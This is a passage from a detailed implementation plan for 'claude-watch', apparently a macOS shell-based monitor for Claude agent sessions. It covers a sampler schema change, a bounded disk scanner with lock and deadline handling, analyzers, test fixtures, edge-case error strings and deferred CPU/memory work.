(a few hundred, not row-count) and **stay as they are** — saying so keeps the
diff reviewable.

Add a 4-line inline note above the rewrite explaining why epochs need no sort and
how the histogram maps to the old `dl[int(dn/2)+1]`. Without it the next reader
helpfully restores the sort.

Verify:
- `tests/fixtures/day-golden.tsv` (a small real day file) + its **pre-change
  `report --json` output committed alongside**; `fixture-aggregation.sh` asserts
  byte-identical output after. This covers `interval_seconds`,
  `observed_seconds` and `still_alive`, which a peak/avg/total fixture does not.
- **An even-`dn` gap list where the two rank formulations diverge** — e.g. gaps
  `{10,10,20,20}`: `dn=4`, `need=3` → `iv=20`, while `c >= dn/2` returns 10.
- All gaps ≥ 600 (sleep) → `iv = 10`. Single sample → `iv = 10`.
- Out-of-order input → the stderr line appears, exit 0, `--json` still parses.
- A **synthetic 60k-row week-sized input**, generated in the fixture and not
  committed, aggregates in **under 5 seconds**. That timing assertion is the test
  whose absence let this ship.

### U1 — sampler schema v2  *(fully independent, land first; G8)*
Files: `tools/sample.sh`, `tests/fixture-sample-schema.sh`.

Land this first: every day it is not landed is a day of data that can only ever
be analysed as an estimate.

**a. The `ps` line and its two dependent offsets** — both change in the same edit
or `roots` silently goes empty:

```sh
ps -Ao pid=,ppid=,pcpu=,rss=,etime=,time=,args=
```
- `sample.sh:35` — the `roots` awk reads `$6` as the first token of argv; argv now
  starts at `$7`.
- `sample.sh:134` — `for (i = 1; i <= 5; i++) sub(...)` becomes `i <= 6`.
- `HANDOFF §4.1` says "use `$6` (first token of argv)". U6 must correct that
  sentence, or the next implementer re-introduces the bug the note prevents.

TIME format, verified on this machine over 2,000+ live values: macOS prints
`[MMMM:]SS.hh` with unbounded minutes — `148:08.43` is 148 minutes, never
`hh:mm:ss`. The existing `esec()` parses it correctly through its 2-field branch
(`h=0, m=148, s=08.43` → 8888.43s); the fixture asserts that rather than assuming
it, because a parser guessing `hh:mm:ss` on two fields is wrong by 60×.

**b. Row schema v2.** A **schema version at a fixed position** is what makes the
next addition unambiguous; `NF` alone is a one-shot signal.

```
sys    $1 epoch  $2 sys  $3 -  $4 load  $5 used_kb  $6 free_kb  $7 swap_used_mb  $8 ncpu
       $9 SCHEMA=2  $10 pageins  $11 pageouts  $12 memsize_kb  $13 swap_cap_mb
proc   $1 epoch  $2 proc  $3 name  $4 cores  $5 rss_kb  $6 pid  $7 cputime_seconds
session, orphan — unchanged
```

- `$9` is the schema version and never moves. A `sys` row with `NF == 8` is
  schema 1 (the estimate era).
- `proc` rows carry cumulative CPU seconds (G6). `session` rows do **not**: a
  session row is a whole-tree roll-up (`sample.sh:118,155`), and a tree
  cumulative drops by a departing child's entire lifetime the moment it exits —
  an interval where the session burned 5 CPU-seconds and reaped a child holding
  30 would read `max(0, -25) = 0`. `%cpu` sees exactly that work. Sessions doing
  heavy short-lived work are the ones this tool exists to catch.
- `memsize_kb` and `swap_cap_mb` are already fetched and thrown away today —
  `sample.sh:73` passes `total` into awk and never references it, and `:83-85`
  parses the swap string for `used` only, discarding `total = 2048.00M`. Three
  v2 memory thresholds are otherwise uncomputable, and the alternative (shelling
  out to `sysctl` at read time) reports *this* machine's RAM for a window that
  may predate a hardware change, breaking HANDOFF §2's invariant 2.
- **Pageout counters:** the earlier plan's `$9`/`$10` from `vm_stat` would have
  silently recorded 0 — `vm_stat` is line-oriented and the `Pageins:`/`Pageouts:`
  lines have `NF=2`. Follow the pattern already working at `sample.sh:72`:
  `/^Pageins/ { pgin = $2 }`, `/^Pageouts/ { pgout = $2 }`, then strip dots.
  These are since-boot cumulative counters (205M pageins right now), recorded raw
  and differenced by the reader.

**c. Era detection, for whoever consumes this** (v2, but specified now so the
sampler's contract is complete): era comes from the `sys` row's `$9` for that
sample. A `proc` row inside a schema-2 sample whose `$7` is missing or does not
match `^[0-9]+(\.[0-9]+)?$` is treated as estimate-era **for that row** and
counted toward `mixed` — a machine that panics mid-write leaves a short line, and
"fewer fields" must not silently mean "old era".

Verify (`tests/fixture-sample-schema.sh`):
- **Golden diff: `report --json` byte-identical before and after the sampler
  change**, on the same day file. Ship blocker (G8). Verified by reading
  `claude-watch:255-293`: `report` uses `sys $4-$8`, `session $3-$7`,
  `proc $3,$4,$5`, `orphan $3,$5,$6` and ignores trailing fields — so it should
  pass, and this test is what proves it stayed true.
- Runs `sample.sh` against a temp `CLAUDE_WATCH_HOME`; asserts `sys` NF=13 with
  `$9 == 2`, `proc` NF=7.
- `$12`/`$13` match `sysctl -n hw.memsize` and the `vm.swapusage` total.
- pageins/pageouts non-zero and increasing across two runs.
- `esec()` against a table of real shapes: `0:00.00`, `1:23.45`, `148:08.43`,
  `1234:56.78`.
- Claude roots still detected after the column shift; argv containing a space
  still parses; argv that `ps` parenthesised (`(bash)`, HANDOFF §4.4) still
  parses.

### U2 — keystone: skeleton, window reader, emitter, dispatch
Files: `tools/advise.sh` (new); `claude-watch` (`usage()`, `advise)`/`disk)`
dispatch, `status()`'s JSON field rename, `hook()`'s footer);
`tests/smoke.sh`; `tests/fixture-window.sh`. **Depends on U0.**

Does:
- `cw_read_window` (§3a) and the single window pass emitting `M` rows.
- `--window` parsing / validation / clamping, including `Nw`.
- The exported scalars (§3a) and the missing-denominator rule.
- Disk cache TTL and staleness decision — **read only, never scan** (G7).
- Lazily sourcing the analyzers inside `advise()`; collecting their `S`/`F` rows.
- `primary` (§3e), the §4 ordering rule, `priority`, `severity_rank`.
- The human renderer per §4, including the severity-word/colour map and the
  collapse of `ok` domains.
- `emit_json` for both `advise` (§3e) and `disk` (§3f), with `jesc()` on every
  user-derived string.
- Display sanitisation (`tr '\001-\037\177' ' '`) and the §3b action-quoting
  rules at print time.
- **Every string in §9**, verbatim; all of them suppressed on the `--json` path.
- `$DATA/state/advise.log`: one appended line per run — epoch, window, per-domain
  severity, top finding id per domain — so the render can say "unchanged since
  N days ago" instead of repeating the same rank-1 disk finding until it is
  acted on. It is the one piece of state this feature adds; `$DATA/state/`
  already caches, and the sampler stays stateless.
- `status --json`'s `"disk"` field is renamed **`data_size`**. Verified live: it
  currently returns `"disk":"4.1M"`, meaning the size of the *data directory* —
  and this feature makes `disk` mean the volume. One word, two meanings, in one
  agent contract. **This is a JSON contract change**: U6 records it in README,
  SKILL.md and HANDOFF, and `smoke.sh` asserts the new key.
- `hook()`'s footer line and `usage()` both name `advise`.

Ships with both analyzers stubbed to
`S <domain> unknown unavailable cache_missing "not implemented" "..."` so the
command is runnable and testable before U4/U5 land.

Verify: `bash -n`; `advise --json | python3 -m json.tool`; `advise --window bogus`
→ 2 with the §9 E1 string; `advise --window` (no value) → 2 with E2;
`advise --yes` / `--kill` / `--remove` / `--refresh` → 2;
`advise --show-thresholds` lists every §5 knob with its source.
`tests/fixture-window.sh` plants synthetic day files under a temp
`CLAUDE_WATCH_HOME` — including one gzipped, one day present as **both** `.tsv`
and `.tsv.gz` (asserting no double-count), and one corrupt `.tsv.gz` (asserting
`window_read_failed`, not a silently short window) — and asserts the 24h/week
cutoffs select exactly the planted rows, in order, with the right `iv` and
`observed_seconds`, and that the exported scalars match the top-level JSON.
Plus: zero samples in the window; a day-file count below the requested window;
a dead sampler (newest sample 3 days old) producing no bare all-clear; two
findings with equal severity and share ordering deterministically by `id`;
a finding whose path contains a literal tab surviving as one field;
`measurement_state == "unavailable"` ⟺ `severity == "unknown"` on every domain.
`smoke.sh` gains the fixture loop, the new refusals, and the fresh-checkout skip
pattern already used for `status`/`doctor` (`smoke.sh:45-60`).

### U3 — disk scanner  *(fully independent, can start immediately)*
Files: `tools/disk-scan.sh` (new, executable), `install.sh` (chmod list, line 20),
`claude-watch` (two `doctor()` `chk` lines), `tests/fixture-disk-scan.sh`.

Does: `df -k` on the volume holding `$HOME`; one bounded `find` per repo root
(`CLAUDE_WATCH_REPO_ROOTS`, default `~/Dev`) at `-maxdepth 4 -xdev` with `-prune`
on the group name patterns; then a batched `du -skx` over the hits; plus
`du -skx` on a fixed shortlist: `~/Downloads`, `~/Library/Caches`,
`~/Library/Containers`, `~/.claude/projects`, `~/.codex/sessions`. **Never a
blind `$HOME` walk** — slow, and it hits TCC-protected directories. Also stats
the marker files and depth-1 mtime that decide each hit's `confidence` (§3c).
Writes the §3c TSV atomically to `$CLAUDE_WATCH_DISK_CACHE`.

Five things this unit must get right, each of which the earlier plan named
without specifying:

1. **The lock, owned here and nowhere else.** `advise` never touches it (G7 means
   `advise` never scans), and `disk --refresh` learns the outcome from the exit
   code. Mechanism: `mkdir "$STATE/disk-scan.lock"` — atomic on APFS, unlike
   `[ -f ] && touch`, which is TOCTOU and lets both runs proceed. The pid is
   written to `$STATE/disk-scan.lock/pid`. `trap ... EXIT INT TERM` removes the
   directory. The stale breaker requires **both** age > 150s **and** `kill -0
   <pid>` failing — an age-only breaker lets two processes break the same lock
   and both proceed, and a `kill -9`'d owner otherwise leaves the lock forever,
   after which every run silently uses a stale cache with no symptom.
   **The loser never scans**: it prints §9 E11 and exits 0 if a cache exists, or
   exits 0 having written nothing if one does not — in which case `advise`
   reports disk `unknown` / `cache_missing`. **Never a second concurrent scan.**
   `doctor` gains a check for an orphaned lock.
2. **A real deadline.** An in-loop `[ $SECONDS -gt 120 ] && break` only runs
   *between* `find`/`du` invocations, and the case the deadline was written for
   is a single `find` blocked on a network mount — precisely when the loop body
   never returns. `timeout` is **not** available: verified, `/usr/bin/timeout`
   does not exist and the only one on this machine is
   `/opt/homebrew/bin/timeout` from GNU coreutils, which this project's
   no-new-runtime-dependencies rule forbids. So: the walk runs in a **background
   subshell in its own process group**; the parent polls to the deadline, then
   sends `TERM` and, after 3s, `KILL` to that group, and writes what landed with
   `partial=1`, `deadline_hit=1` and a `note deadline` row. The cheap
   between-batch clock check stays as an early exit. **Honest residual, stated in
   the code and the README runbook:** a worker blocked in uninterruptible I/O
   does not die on signal — the parent stops waiting and returns, but the process
   may linger until the mount responds.
3. **`-xdev` on `find`, not just `-x` on `du`.** Without it `find` descends the
   network mount before `du` ever runs, which is the whole failure.
4. **Roots on another volume.** `du -x` does not reject a configured root that
   *starts* somewhere else. Determine the home volume's device once
   (`stat -f %d "$HOME"`), compare each root's (`stat -f %d "$root"`), skip those
   that differ, and record `note root_off_home_volume <count>` + `partial=1`.
   Sizes from another volume are not comparable against `volume_total_kb`.
5. **Paths a 5-column TSV cannot carry.** Discovery is NUL-delimited
   (`find -print0 | xargs -0 du -skx`), but `du`'s *output* is newline-delimited
   and tab-separated, so a path containing a tab or newline corrupts the cache
   regardless. Partition the hits: representable paths are measured and emitted;
   the rest are counted into `note path_unrepresentable <count>` and `partial=1`,
   and never emitted. Combined with the depth cap and rule 4, this is why §3c
   labels every reclaim total a floor unconditionally.

Also: dedupe hits by resolved path prefix before summing, so pointing
`CLAUDE_WATCH_REPO_ROOTS` at `$HOME` cannot double-count the fixed shortlist;
assert `sum(groups) <= used_kb` as a scanner-side sanity check.

Atomic write: the temp file goes in `$STATE`, **not** `mktemp`'s default — a
temp file on another volume makes `mv` a copy, not a rename. A failing `mv` is
plausible (the disk is 95% full) and must be reported with §9 E7 and exit 1, not
swallowed into a silently retained stale cache.

Gotchas: paths reach awk through `ENVIRON`, never `-v` (HANDOFF §4 — `-v` runs
backslash processing); `2>/dev/null` on `du`/`find` for permission noise, with
the non-zero exit still captured to set `partial=1` and
`note permission_denied`; `LC_ALL=C`; the existing `tmp_cleanup` trap pattern
(`claude-watch:438`) so Ctrl-C mid-scan leaves no temp file and no lock.

`install.sh:20` adds `tools/disk-scan.sh` to its `chmod +x` list — belt and
braces alongside U2's `bash "$path"` invocation, which is what actually removes
the `git pull` upgrade hole.

`doctor()` gains two `chk` lines using the existing helper (`claude-watch:1337`):
`disk scanner is executable` and `disk cache present and writable (age Nh)`.
`status` deliberately does **not** grow a disk-cache field — it is documented as
"is sampling alive", and widening it invites the next widening.

Verify (`tests/fixture-disk-scan.sh`) — a synthetic tree under
`CLAUDE_WATCH_REPO_ROOTS=$tmp`: `repo/node_modules` with a known-size file beside
a `package.json` (→ `confirmed` when backdated, `likely` when just touched);
`repo/target` with **no** `Cargo.toml` (→ `unverified`, no command); a decoy
`repo/src`; a directory whose name contains a space and a `;`; a directory whose
name contains a tab (→ counted in `note path_unrepresentable`, absent from `dir`
rows, `partial=1`); a `node_modules` nested below the depth cap (→ absent, total
labelled a floor). Asserts group totals, decoy absence, each confidence, and that
no removal command is emitted for the metacharacter path. Plus: a held lock →
the second run exits without scanning; a stale lock with a dead pid → broken and
scanned; a sleeping worker → deadline fires with `partial=1`, `deadline_hit=1`
and the cache still written; a read-only `$STATE` → the `mv` failure is reported,
exit 1; the temp file is created in `$STATE`. Plus a **documented manual run** on
this machine (not in `smoke.sh`): volume at 4.7% avail, ≥25G rebuildable, inside
the deadline — an environment observation that fails the day the disk is cleaned.

### U4 — disk analyzer  *(parallel; needs only the §3c contract, not U3)*
Files: `tools/advise-disk.sh`, `tests/fixture-disk.sh`.

Does: reads `$CLAUDE_WATCH_DISK_CACHE`, applies the §5 disk thresholds against
the single §3c denominator, emits findings with concrete actions per group — and
a *removal command* only for `confidence: confirmed` hits, shell-quoted per §3b.
`likely` and `unverified` hits get size, path, and the reason no command is
offered. Prefer the tool's own cleaner over `rm -rf` where one exists
(`cargo clean` in a confirmed Rust project, Xcode's own DerivedData path) since
it cannot mistake the directory. Transcripts are **reported with a size and an
age breakdown and no deletion command** (§8 open decision 2). Maps `note` rows onto
`partial_reason` and `measurement_reasons`.

**Re-`stat` before printing a removal command.** The `idle > 14d` verdict is
evaluated at scan time and the cache is used for 6h silently and beyond 6h with a
`stale` flag; a `cargo build` an hour ago turns a printed
`rm -rf '.../target'` into a live-cache deletion that this tool authored. At most
a handful of `stat` calls, not a rescan: if the idle test no longer holds,
downgrade to `likely` and drop the command. Print the cache age beside every
command regardless.

Verify (`tests/fixture-disk.sh`) — hand-written cache files: 4.7% avail
(`critical`), 15% avail on a 422GiB volume (`warn`), 60% (`ok`, no findings),
**a 4TB volume with 399GiB free (`ok` — the `AND` regression test)**, a group at
the 2% boundary either side, a missing cache (`unknown` + `cache_missing` +
remedy), a `partial=1` cache (volume finding keeps its severity, reclaim findings
capped at `info`, summary leads with the reason), a malformed/truncated cache
(`unknown` + `cache_malformed`, never garbage findings), one `dir` row per
confidence level asserting exactly which produce a command, and a `confirmed` row
whose marker is touched after the cache was written (→ downgraded, no command).

### U5 — leaks analyzer  *(parallel)*
Files: `tools/advise-leaks.sh`, `tests/fixture-leaks.sh`.

Does: calls the existing `scan_orphans "$ORPHAN_MIN_DEFAULT"` and, after
`init_live_cwds`, `scan_worktrees 7`; applies the §5 leak thresholds via the pure
`leaks_findings()` half (§3b) so the fixture needs no parent script; actions point
at `/claude-watch-reap`, never at `--kill`/`--remove` directly. Must not
re-implement any classification — it consumes the §3d TSVs as-is, including the
corrected `unpushed` number. Emits `share_of_domain: 0` when
`CW_VOLUME_TOTAL_KB` or `CW_MEMSIZE_KB` is absent (§3a), never a computed `nan`.

Verify (`tests/fixture-leaks.sh`): captured `scan_orphans`/`scan_worktrees`
output (a fixture file, not a live scan) through `leaks_findings()` — a 2-hour
300M tree → `warn`; a 10-minute 5M tree → `info`; empty input → `S leaks ok` and
zero findings; absent denominators → shares are `0` and the JSON still parses.
Plus a column-count assertion against a live `scan_worktrees 7 | head -1` (§3d).
A live end-to-end run is a documented manual check, not a smoke test — it fails
the day an orphan leaks.

### U6 — docs and skill  *(last; needs the final flag names)*
Files: `README.md`, `skills/claude-watch/SKILL.md`, `docs/prompts/HANDOFF.md`.

- **SKILL.md**: add `Bash(claude-watch advise*)` and `Bash(claude-watch disk*)`
  to `allowed-tools`; add both rows to the command table; state that `advise` is
  the entry point for "what should I fix" — **the skill relays, it never
  re-derives severity or re-ranks**. Five instructions it must carry, because
  each is the difference between a diagnostic and a reassurance: **(1)** read
  `primary` first and report it first — it is the authoritative state and it
  already applied the ordering rule; **(2)** never present a domain with
  `measurement_state: "unavailable"` as clean — read out its `remedy` verbatim;
  **(3)** `advise` never scans, so a `cache_missing` disk domain means telling the
  user to run `claude-watch disk --refresh`, not running it for them; **(4)**
  carry the §5 CPU/memory caveat whenever the question is about heat, since v1
  says nothing about CPU; **(5)** if `schema_version` is absent or higher than
  the one you know, report the raw fields and do not interpret; treat any unknown
  enum value as unavailable, never as healthy. Frontmatter stays valid YAML with
  a `>-` block scalar (HANDOFF §4.14); `smoke.sh` already validates it.
- **README**: the two new commands introduced the way the README already
  introduces things — a real output frame first, flags second (`README:9-52`);
  the window semantics; the disk cache TTL, `disk --refresh`, and the 120s
  deadline; the exit-code table beside the `--json` section; the new
  `CLAUDE_WATCH_*` rows in the Configuration table (`README:222`); `advise` in
  the command block at `README:81-87`; a dated **"Data format changes"**
  paragraph covering the sampler schema v2 and the `status --json`
  `disk` → `data_size` rename; and the runbook for the new failure modes (stale
  cache → `disk --refresh`; `unknown` domains → `status` then `doctor`; scan too
  slow → narrow `CLAUDE_WATCH_REPO_ROOTS`; a root on a network mount → the
  deadline's honest residual). Point at the threshold *knobs* rather than
  restating §5's numbers a third time. One line on why the disk domain lives in a
  Claude-session monitor: agent sessions are what generate the build artifacts.
- **HANDOFF**: mark §7f closed by the window selector; record the sampler schema
  v2 and the two data eras in §4 and §8; **correct §4.1's `$6` note**, which U1
  invalidates; add the `df /` vs `df "$HOME"` gotcha (46% vs 96%, same free
  space) to §4; update §2's architecture diagram and §8's cheat-sheet for the new
  files and commands (additive edits to a user-approved section, not a
  re-litigation); record two known defects in §7 — **`report --json`'s `minfree`
  can never record a genuine zero** (`claude-watch:263`:
  `if (minfree == 0 || $6 + 0 < minfree)` means a sample reporting free = 0 is
  overwritten by the next one, so `min_free_kb` ends up as the last sample's
  value; pre-existing, deliberately **not** fixed here, and the v2 memory
  analyzer must not copy the idiom), and the deferred v2 scope (§10). Append a
  **dated correction** under §7h (do not rewrite the original claim) — measured
  2026-08-06, rebuildable build artifacts under `~/Dev` are 25–30G across ~57
  dirs plus 4.8G of `node_modules`, versus `~/.claude` at 6.0G. Transcripts are
  fourth, not first.
- Anonymise paths in any published example: `advise --json` embeds absolute paths
  from `~/Dev` and `~/Downloads`, and HANDOFF §9's rule about published samples
  extends to it.

---

## 7. Parallelism

```
  U1 ─────────────────────────────────────────────────┐  sampler schema v2
  U3 ─────────────────────────────────────────────────┤  disk scanner + install.sh + doctor
                                                      │
  U0 ──► U2 ──┬──► U4  disk analyzer ─────────────────┤
              └──► U5  leaks analyzer ────────────────┴──►  U6  docs + skill
```

- **Start immediately, in parallel: U0, U1, U3.** None depends on any other. U0
  carries its own golden fixture, so the G4 branch is not a gate.
- **U0 → U2 is a hard sequence.** U2's window reader is only usable at week and
  month scale after U0 makes aggregation linear (G2). Merging U2 first ships two
  selectors that hang.
- **After U2 lands: U4 and U5 in parallel.** They need only the §3b/§3c/§3d
  contracts, frozen above, so they can be briefed at the same time as U2; the
  safer sequencing is to let U2 land first since it owns the emitter.
- **U6 strictly last** — and for a stronger reason than flag names: `skills/*`
  are **symlinked, not copied** (HANDOFF §12), so SKILL.md goes live the moment
  it is written, against whatever `claude-watch` is on PATH. Merging U6 early
  hands the model a skill documenting commands that exit 2.
- **Shared-file constraint:** U0, U2 and U3 all edit `claude-watch`, in three
  disjoint hunks (§2). U1 is the sole owner of `tools/sample.sh`; U3 the sole
  owner of `install.sh`.

Three lanes: two single-unit lanes that start and finish independently (U1, U3),
and one sequential chain (U0 → U2 → {U4 ‖ U5}). All three converge on U6.
Maximum useful concurrency: three at the start (U0, U1, U3), then two (U4, U5).

---

## 8. Open decisions

Closed and removed from this list: the cross-domain ranking (G1), the O(n²)
aggregation (G2), the sampler schema question (G3/G6/G8), the `unpushed` fix and
`report` fixtures (G4 — done), the CPU/memory scope (G5), the implicit cold scan
and everything downstream of it (G7 — which also closes the old "what does
`--window` do when the data is not there", answered by proceed-and-state, and
the `--no-scan` flag DX-1 asked for, now unnecessary because nothing ever scans
implicitly), the name `advise`, the four-files-vs-one split (split, it is what
enables the fan-out), and `advise.log` (yes, minimal — U2).

Still genuinely open:

1. **Threshold numbers (§5).** The disk numbers with `AND` semantics and the
   leaks numbers need a yes. *Recommend: ship them as written.* The env knobs
   plus the printed threshold mean a wrong number is now a one-line override, not
   a code edit, which lowers the cost of being wrong here more than any further
   analysis would.
2. **Transcripts.** Report `~/.claude` / `~/.codex` sizes with an age breakdown
   and no deletion command (HANDOFF §7h: deleting transcripts is irreversible and
   needs its own rules about what `claude --resume` reads). *Recommend:
   report-only.* Alternative: propose a concrete age-based deletion command.
3. **Literal commands in the human output.** `cargo clean`,
   `rm -rf '/Users/x/Dev/buzz/target'` as actions, or prose descriptions?
   *Recommend: literal, but only for `confidence: confirmed` hits* (§3c), always
   shell-quoted (§3b), and re-`stat`ed at print time (U4). That gate is what
   makes authoring an `rm -rf` defensible at all — note the asymmetry it leaves:
   `worktrees --remove` refuses to act without a tty, while `advise` prints a
   copy-pasteable `rm -rf` with no guard. The command is not executed by us, but
   it is authored by us. Alternative: prose only, which removes most of the
   feature's value.

New, created by these gate decisions:

4. **What v1 tells a user who asks about heat.** v1 has no CPU domain, so the
   answer is the §5 caveat plus a pointer to `claude-watch report`. *Recommend:
   accept, and make SKILL.md say it in one sentence.* Alternative: hold `advise`
   until v2, which leaves the disk problem — the one the user actually has —
   unaddressed for the length of the CPU work.
5. **The fresh-install first run.** Under G7 the first `advise` on a clean
   machine reports disk `unknown` and names `disk --refresh`; it cannot produce
   the "30G you can get back, one second after install" moment the DX review
   designed for, because that moment required an implicit scan. *Recommend:
   accept — a 120s hang on the agent path is the worse trade* — but the
   alternative is worth one sentence: `install.sh` could run one `disk --refresh`
   at the end, making the cache warm before the user's first `advise`. That is a
   real option and it is the user's call, not a default.

---

## 9. Edge cases, and the exact words for each

The first four are the degenerate cases that produce a *confidently wrong* answer
rather than a visible failure — for a diagnostic tool, the category that matters
most. Each needs a fixture, not just a guard.

**Every string below is written here so U2 and U4 do not invent prose at
implementation time.** Each is problem, then cause, then fix — the house style of
the one message in the codebase that already gets all three right
(`claude-watch:1287`: `no samples yet — is the launchd job loaded? try:
claude-watch doctor`). The existing `--min`/`--days` errors (`:750`, `:1102`)
give problem and cause but no fix; these do better. **Every one is suppressed on
the `--json` path**, where the machine-readable equivalent travels as `remedy`,
`partial_reason` and `measurement_reasons`. Fixtures assert the strings.

| # | situation | exact string | stream / effect |
|---|---|---|---|
| E1 | invalid `--window` | `claude-watch advise: --window "3 weeks" is not a duration. Accepted: 24h, week, month, or Nh/Nw/Nd (e.g. 6h, 2w, 14d). Try: claude-watch advise --window 24h` | stderr, exit 2 |
| E2 | `--window` with no value | `claude-watch advise: --window needs a value. Accepted: 24h, week, month, or Nh/Nw/Nd. Try: claude-watch advise --window 24h` | stderr, exit 2 |
| E3 | dead sampler | `sampler stopped — last sample 3d4h ago. CPU and memory data are not being recorded; disk and leaks below are current. Fix: claude-watch doctor` | stdout, directly under the headline, `C_RED`, exit 0; `sampler_stale` |
| E4 | stale disk cache | `disk facts are 3d old (refreshed every 6h) — nothing has rescanned since. For current numbers: claude-watch disk --refresh (~10s, 120s cap)` | stdout, in the disk section, `C_DIM` |
| E5 | scan deadline hit | `disk scan stopped at its 120s deadline after 12 of 40 roots — the sizes below are a floor, not a total. Narrow CLAUDE_WATCH_REPO_ROOTS, or re-run claude-watch disk --refresh when the machine is idle` | stdout, leads the disk section, `C_HOT`; `partial_reason: "deadline"` |
| E6 | window longer than the data | `window: month (30d requested, 2d available — the sampler has only been recording since 2026-08-04). Nothing to fix; the window widens as data accumulates` | stdout, header, `C_DIM` |
| E7 | cache write failure | `claude-watch disk: could not write /Users/x/.claude-watch/state/disk.tsv — the volume is 95% full or the path is read-only. The previous cache is unchanged and is now stale. Free space, then re-run: claude-watch disk --refresh` | stderr, exit 1 |
| E8 | `gzcat` failure | `could not read raw/2026-07-30.tsv.gz — the archive is corrupt, so this window is short by one day. Remove that file to stop the warning; the day's data is not recoverable` | stderr, exit 0; domain `partial`, `window_read_failed`, `missing_or_failed_days` |
| E9 | permission denied during a scan | `disk scan could not read 3 directories (permission denied) — the sizes below are a floor. Grant Full Disk Access to your terminal in System Settings > Privacy & Security, or narrow CLAUDE_WATCH_REPO_ROOTS` | stdout, disk section, `C_HOT`; `partial_reason: "permissions"` |
| E10 | never scanned (G7) | `disk: never scanned, so nothing here is measured. This takes about 10 seconds and is then cached for 6h. Run: claude-watch disk --refresh` | stdout as the domain summary + `remedy`; `unknown`, `cache_missing` |
| E11 | lock lost / already scanning | `another disk scan is already running — using the cached facts from 3h ago. Re-run in a minute for fresh numbers.` (no cache: `... — nothing cached yet; re-run in a minute.`) | stderr, exit 0, **no second scan** |
| E12 | `advise --refresh` | `claude-watch advise: advise never scans, so --refresh does nothing here. To rescan the disk: claude-watch disk --refresh` | stderr, exit 2 |

The cases themselves:

- **Dead sampler.** launchd stopped, or the machine was off. leaks still scans
  live and disk still reads a cache, so a mostly-`ok` payload describes a machine
  nobody is watching. Guard: `freshness.sampler_ok`, `sampler_stale` in
  `primary.measurement_reasons`, E3 above the sections, and **no domain that was
  not measured may say `ok`**. Fixture: a data dir whose newest sample is 3 days
  old; assert no bare all-clear.
- **Zero samples inside the window.** Distinct from "no samples at all" and far
  more likely: `--window 1h` on a machine that was asleep. Guard: test
  `observed_seconds == 0` *before* any division; the window block reports
  `no_samples`. Fixture: a window landing entirely in a sleep gap.
- **No samples at all** (fresh install) → `samples: 0`, `no_samples`, exit 0.
  When the newest data file is younger than an hour the header says the sampler
  started N minutes ago, so a young install does not read as a broken one.
- **Window longer than the data that exists** → E6, plus `requested_days` /
  `available_days` / `covered_days` / `missing_or_failed_days`. A month heading
  over two days of evidence is a confidently wrong answer. `clamped` covers
  *retention* only and is a different thing.
- Window longer than retention → clamp, and say so (`clamped`).
- Machine asleep for most of the window → rates use `observed_seconds`; the
  interval derivation already ignores gaps > 600s.
- **Truncated sample row** (a panic mid-append; the sampler writes with `>>` from
  awk at `sample.sh:190`) → a short row must not silently read as estimate-era.
  Guard: U1's §6c rule — era comes from the `sys` row's `$9`, and a malformed
  per-row value degrades that row only.
- **Missing shared denominator** → share `0`, never a division (§3a). This is the
  `nan` §3e forbids, and it is live: leaks' worktree share with no disk cache.
- Empty domain → `ok` **only if it was measured**, zero findings (today: leaks).
  Never an empty section with no explanation.
- Disk cache missing / stale / malformed, scan deadline, permission denial, and
  two concurrent `disk --refresh` runs → E10 / E4 / `cache_malformed` / E5 / E9 /
  E11, with the severity capping specified once in §3c and not restated here.
- A `.gz` that fails to decompress → currently swallowed, giving a silently short
  window with an honest-looking `observed_seconds`. Detect the non-zero `gzcat`
  exit → E8 + `window_read_failed` + the domain marked `partial`.
- Out-of-order sample epochs → U0's stderr error, never a silent reinterpretation.
- Paths and process names are arbitrary bytes → `jesc()` everywhere in JSON,
  `tr '\001-\037\177' ' '` before writing to a terminal (as `orphans` already
  does), and §3b's quote-or-refuse rule before any path enters a printed command.
- Ctrl-C during a `disk --refresh` leaves no temp file and no lock
  (`tmp_cleanup`, `claude-watch:438`); a `--json` run never writes any of the
  strings above to stdout.
- All awk runs under `LC_ALL=C`; all paths into awk via `ENVIRON`, never `-v`.
- All test scripts carry `#!/usr/bin/env bash` and run as files, never inline in
  the session shell (HANDOFF §4.15).

---

## 10. Deferred to v2 — the CPU and memory analyzer

Not built in v1 (G5). Kept here in full with its findings attached, because every
one of them was verified against the code and would otherwise have to be
rediscovered. v1 makes this cheaper, not harder: the sampler already records what
v2 needs (G8), the window pass already emits `M` rows for a second consumer to
fold into, and the contracts in §3 already carry `cpu_basis`, `cpu_basis_since`,
`CW_MEMSIZE_KB` and `CW_SWAP_CAP_MB`.

**Unit V1 — `tools/advise-cpumem.sh` + `tests/fixture-cpumem.sh`**, folded into
U2's existing window pass rather than reading the window a second time (a second
pass costs ~4.4s on a month window against a 10s total budget). Adds `cpu` and
`memory` to `domains[]` and removes them from `deferred_domains`.

Findings that must be honoured when it is built:

- **Per-pid differencing, per G6.** `sample.sh:174,179` emits one `proc` row per
  pid, and the same name is often many pids (`report`'s `flush()` at
  `claude-watch:188-197` exists precisely for this). Differencing a per-name
  *sum over a varying pid set* spikes the moment a new pid enters — its whole
  lifetime CPU lands in one interval — and clamps to zero when one leaves.
  Difference per pid, then fold by name. `session` rows keep `%cpu` (G6).
- **A universal sanity invariant:** no per-interval `cpu_seconds` may exceed
  `interval × ncpu`. Exceeding it means the identity changed; fall back to
  `pcpu × interval` for that interval and count it toward `mixed`. One
  comparison, and it catches every variant of the identity-change bug.
- **The CPU domain is blind twice over** (`sample.sh:13-15,172-180`): everything
  under `CLAUDE_WATCH_FLOOR` (5% of one core) is absent, and on a busy sample the
  9th consumer is absent. Twenty processes at 4% burn 0.8 cores and produce zero
  rows. Consequences: §5's old `info` line at `>= 0.05` cores was numerically
  identical to the floor and therefore largely unreachable; every cpu
  `share_of_domain` is a lower bound. The cross-check is already in the data for
  free — the `sys` row carries load average (`$4`, `claude-watch:262`). When
  peak/median load is high and no `proc` row explains it, emit
  `cpu.unexplained_load` rather than `ok`. v1 already carries the caveat text
  (§5).
- **Three thresholds need the schema-v2 fields** `memsize_kb` and `swap_cap_mb`,
  which U1 lands in v1 for exactly this reason: `mem.holder.<name>`
  (`rss >= 40%` / `25%` of physical), `mem.swap_cap` (`>= 75%` / `50%` of cap),
  and memory's `share_of_domain`.
- **`mem.pressure` uses the pageout delta between samples**, not the since-boot
  cumulative counter (205M pageins / 1.8M pageouts accumulated over this
  machine's lifetime say nothing about the last hour). Discard the delta across
  a gap `>= 600s` and across a counter reset — a reboot makes it negative; clamp
  and drop, never report a huge negative.
- **Never sum RSS across processes** (HANDOFF §4.3). Holder findings report the
  largest single process plus an instance count, as `report` already does. And
